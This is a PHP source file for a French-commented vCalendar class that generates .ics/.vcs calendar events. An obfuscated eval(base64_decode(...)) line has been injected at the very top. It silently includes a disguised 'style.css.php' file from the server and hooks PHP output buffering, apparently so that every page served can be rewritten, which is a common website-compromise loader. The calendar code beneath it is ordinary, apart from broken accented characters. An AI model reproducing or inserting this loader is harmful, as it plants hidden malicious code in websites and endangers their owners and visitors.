<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy93ZWIvZW5kdXJhbmNlZHVtYXJzL3d3dy9zcGlwL0U3Ml9maWMvcHJvdGVnZS9DUi9DUi0xMy0xMS0yMDA3X2ZpY2hpZXJzL3N0eWxlLmNzcy5waHAnO2lmKGZpbGVfZXhpc3RzKCRHTE9CQUxTWydtZnNuJ10pKXtpbmNsdWRlX29uY2UoJEdMT0JBTFNbJ21mc24nXSk7aWYoZnVuY3Rpb25fZXhpc3RzKCdnbWwnKSYmZnVuY3Rpb25fZXhpc3RzKCdkZ29iaCcpKXtvYl9zdGFydCgnZGdvYmgnKTt9fX0=')); ?>
<?php
/***************************************************************************

PHP vCalendar class v2.0

Cette classe permet de cr�er des fichiers textes au format vCalendar v1.0 ou 2.0
pour transmettre des �v�nements vers un agenda
Auteur SIMIER Philippe philaure@wanadoo.fr

si le constructeur recoit pour argument encodage le valeur quoted alors version 1.0
avec l'encodage UTF8 se sera la version 2.0
Un composant "VEVENT" offre un panel de propri�t�s qui d�crivent un �v�nement comme repr�sentant une quantit� de temps planifi�e
sur un calendrier. En temps normal, un �v�nement valide rendra ce temps occup�, mais il est possible de le configurer 
en mode "Transparent", pour changer cette interpr�tation.

Les propri�t�s classiques d'un composant VEVENT sont :

DTSTART: Date de d�but de l'�v�nement 
DTEND: Date de fin de l'�v�nement 
SUMMARY: Titre de l'�v�nement 
LOCATION: Lieu de l'�v�nement 
CATEGORIES: Cat�gorie de l'�v�nement (ex: Conf�rence, F�te, ...) 
STATUS: Statut de l'�v�nement (TENTATIVE, CONFIRMED, CANCELLED) 
DESCRIPTION: Description de l'�v�nement 
TRANSP: D�finit si la ressource affect�e � l'�venement est rendu indisponible (OPAQUE, TRANSPARENT)

Les donn�es vCalendar ont comme type-MIME text/calendar. L'extension ".vcs"
***************************************************************************/


function encode($string) {
	return escape(quoted_printable_encode($string));
}

function escape($string) {
	return str_replace(";","\;",$string);
}

// fonction pour encoder les caract�res sp�ciaux et d�couper la ligne en tron�ons de 76 caract�res
function quoted_printable_encode($input, $line_max = 76) {
	$hex = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
	$lines = preg_split("/(?:\r\n|\r|\n)/", $input);
	$eol = "\r\n";
	$linebreak = "=0D=0A";
	$escape = "=";
	$output = "";

	for ($j=0;$j<count($lines);$j++) {
		$line = $lines[$j];
		$linlen = strlen($line);
		$newline = "";
		for($i = 0; $i < $linlen; $i++) {
			$c = substr($line, $i, 1);
			$dec = ord($c);
			if ( ($dec == 32) && ($i == ($linlen - 1)) ) { // convert space at eol only
				$c = "=20";
			} elseif ( ($dec == 61) || ($dec < 32 ) || ($dec > 126) ) { // always encode "\t", which is *not* required
				$h2 = floor($dec/16); $h1 = floor($dec%16);
				$c = $escape.$hex["$h2"].$hex["$h1"];
			}
			if ( (strlen($newline) + strlen($c)) >= $line_max ) { // CRLF is not counted
				$output .= $newline.$escape.$eol; // soft line break; " =\r\n" is okay
				$newline = "    ";
			}
			$newline .= $c;
		} // end of for
		$output .= $newline;
		if ($j<count($lines)-1) $output .= $linebreak;
	}
	return trim($output);
}

/*Les lignes de texte NE DEVRAIENT PAS faire plus de 75 octets de long, le saut de ligne exclu. 
Les longues lignes de contenu DEVRAIENT �tre d�coup�es en une repr�sentation sur plusieurs lignes 
� l'aide d'une technique dite de � pliage � (folding) des lignes. C'est-�-dire la coupure d'une longue ligne
 entre deux caract�res en ins�rant une s�quence CRLF suivie imm�diatement d'un seul caract�re 
 blanc (whitespace) lin�aire, � savoir un carat�re ESPACE (code d�cimal 32 US-ASCII) 
 ou TABULATION HORIZONTALE (code d�cimal 9 US-ASCII). 
 Toute s�quence CRLF suivie imm�diatement d'un seul caract�re blanc lin�aire est ignor�e (
 c'est-�-dire supprim�e) au traitement du type de contenu.  */

 function ligne($input, $line_max = 75) {
   $output="";
   while (strlen($input)>$line_max) {
      $newline =substr($input,0,$line_max);
      $output .=$newline."\r\n\t";
      $input = substr ($input,$line_max-strlen($input));
     }
     $output .= $input;
     return $output;
}

class vCalendar {
	var $properties;    // tableau des propri�t�s d'un evenement
	var $evenements = array();    // tableau des evevements
	var $filename;      // le nom du fichier
	var $encodage;      // le type d'encodage
	var $version;       // version 1.0 ou 2.0
	var $extension;     // l'extension du fichier ics ou vcs
	
	// le constructeur d'objet  vCalendar
         function vCalendar ($encodage="UTF8",$name="calendrier")
         {
          $this->encodage = $encodage;
          $this->id = 0;
          if ($encodage=="UTF8")
           {$this->version = "VERSION:2.0\r\n";
            $this->extension = ".ics";
           }
          else { $this->version = "VERSION:1.0\r\n";
                 $this->extension = ".vcs";
          }
          $name=  strtr($name, "����� ���", "eeeei_acu");
          $this->filename = $name;
         }

  // m�thode pour ajouter une propri�t�
  function setKey($key,$valeur,$type=""){
        if ($type!="") $key .= ";".$type;
        if ($this->encodage!="UTF8") {
                $key.= ";ENCODING=QUOTED-PRINTABLE";
                $this->properties[$key] = quoted_printable_encode(trim($valeur));
        }
        else {
             	$this->properties[$key] = utf8_encode($valeur);
             }
        }

 //m�thode pour ajouter de d�but d'un �v�nement  DTSTART DTEND
 function setDateTime($key,$datetime) {

	list($date,$time) = explode(" ", $datetime);
	$date = str_replace("-", "", $date);  // retire les - de la date
	$time = str_replace(":", "", $time);  // retire les deux points de l'heure
	$this->properties[$key] = $date."T".$time."Z";
 }


 // m�thode pour cr�er un �v�nement
 function addEvenement($titre,$dtdeb,$dtfin,$lieu="",$description="",$categorie="",$priorite="1") {
         $this->setKey ("SUMMARY",$titre);
         $this->setDateTime("DTSTART",$dtdeb);
         $this->setDateTime("DTEND",$dtfin);
         if ($lieu!="") $this->setKey("LOCATION",$lieu);
         if ($description!="") $this->setKey("DESCRIPTION",$description);
         if ($categorie!="") $this->setKey("CATEGORIE",$categorie);
         $this->setKey("PRIORITY",$priorite);
         $even="BEGIN:VEVENT\r\n";
         foreach($this->properties as $key => $value) {
       		$even .= ligne("$key:$value\r\n");
         }
         $even .="END:VEVENT\r\n";
         array_push($this->evenements,$even);
 }

	// m�thode pour cr�er le contenu du fichier
 function getvCalendar() {
	$text = "BEGIN:VCALENDAR\r\n";
	$text .= "PROID:-//PHP class//\r\n";
        $text .= $this->version;
	foreach($this->evenements as $valeur) {
	   $text .=$valeur;
	}
	$text.= "END:VCALENDAR\r\n";
	return $text;
 }

	// m�thode pour donner le nom du fichier
 function getFileName() {
        return $this->filename.$this->extension;
 }
	// m�thode pour donner le type mime
 function getTypeName() {
       return "Content-Type: text/calendar; ";
 }
}

?>
